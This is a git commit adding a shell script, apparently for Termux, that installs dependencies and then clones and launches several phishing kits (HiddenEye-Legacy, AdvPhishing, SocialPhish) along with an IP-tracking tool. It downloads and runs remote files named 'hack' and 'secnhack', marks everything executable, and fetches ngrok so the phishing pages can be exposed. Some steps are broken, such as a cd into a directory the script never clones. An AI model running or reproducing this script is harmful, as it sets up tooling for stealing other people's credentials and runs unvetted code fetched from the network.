be482c432e7615b53fa16c3f191de17b8ec0f053
T-Dynamos <68729523+T-Dynamos@users.noreply.github.com>
2021-06-04 10:23:10 +0530

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,43 @@
+apt update
+apt upgrade -y
+apt install wget -y
+apt install root-repo
+apt install unstable-repo
+apt install x11-repo
+apt install git -y
+apt install python -y
+apt install python-pip -y
+pip install lolcat
+$green
+git clone https://github.com/Ignitetch/AdvPhishing
+git clone https://github.com/T-Dynamos/Maths_Bot m_bot
+git clone https://github.com/Cabbagec/termux-ohmyzsh
+git clone https://github.com/rajkumardusad/IP-Tracer.git ip
+git clone https://github.com/DarkSecDevelopers/HiddenEye-Legacy server
+wget https://raw.githubusercontent.com/T-Dynamos/termux-pro/main/mbot
+wget https://raw.githubusercontent.com/T-Dynamos/Tvirus2.0/main/hack
+python HiddenEye.py
+cd SocialPhish
+bash socialphish.sh
+cd AdvPhishing
+rm -rf secnhack
+wget https://raw.githubusercontent.com/T-Dynamos/advphishing/main/secnhack
+bash Android-Setup.sh
+cd
+cd ip
+chmod +x *
+./install
+cd
+cd termux-ohmyzsh
+bash install.sh
+cd
+chmod +x *
+pip install lolcat 
+pip install colorama
+pip install table-ex
+pip install py-loader
+pip install requests
+cd
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip 
+echo -e [*] Enter Your Ngrok Authtoken = 
+echo -e example ./ngrok authtoken 1rh7F
